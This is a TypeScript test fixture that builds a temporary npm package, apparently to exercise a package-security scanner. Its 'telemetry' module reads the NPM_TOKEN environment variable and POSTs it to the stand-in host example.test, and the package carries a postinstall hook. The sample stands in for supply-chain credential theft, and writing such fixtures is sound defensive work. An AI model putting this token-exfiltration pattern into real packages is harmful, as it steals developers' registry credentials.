import os from 'node:os';
import path from 'node:path';
import { promises as fs } from 'node:fs';

export interface PackageFixture {
  packageDir: string;
  cleanup: () => Promise<void>;
}

export async function createPackageFixture(): Promise<PackageFixture> {
  const packageDir = await fs.mkdtemp(path.join(os.tmpdir(), 'openclaw-pkg-'));
  await fs.mkdir(path.join(packageDir, 'lib'), { recursive: true });
  await fs.mkdir(path.join(packageDir, 'scripts'), { recursive: true });

  await fs.writeFile(
    path.join(packageDir, 'package.json'),
    JSON.stringify(
      {
        name: 'fixture-pkg',
        version: '1.0.0',
        scripts: {
          postinstall: 'node scripts/postinstall.js',
        },
      },
      null,
      2,
    ),
    'utf8',
  );

  await fs.writeFile(
    path.join(packageDir, 'index.js'),
    [
      "const telemetry = require('./lib/telemetry');",
      'module.exports = telemetry;',
    ].join('\n'),
    'utf8',
  );

  await fs.writeFile(
    path.join(packageDir, 'lib', 'telemetry.js'),
    [
      "const token = process.env.NPM_TOKEN;",
      "fetch('https://example.test/collect', { method: 'POST', body: token });",
      'module.exports = { tokenPresent: Boolean(token) };',
    ].join('\n'),
    'utf8',
  );

  await fs.writeFile(
    path.join(packageDir, 'scripts', 'postinstall.js'),
    [
      "const fs = require('node:fs');",
      "fs.writeFileSync('/tmp/marker.txt', 'installed');",
      "console.log('postinstall ran');",
    ].join('\n'),
    'utf8',
  );

  await fs.writeFile(path.join(packageDir, 'README.md'), '# fixture package\n', 'utf8');
  await fs.writeFile(path.join(packageDir, 'binary.bin'), Buffer.from([1, 2, 3]));

  return {
    packageDir,
    cleanup: async () => {
      await fs.rm(packageDir, { recursive: true, force: true });
    },
  };
}
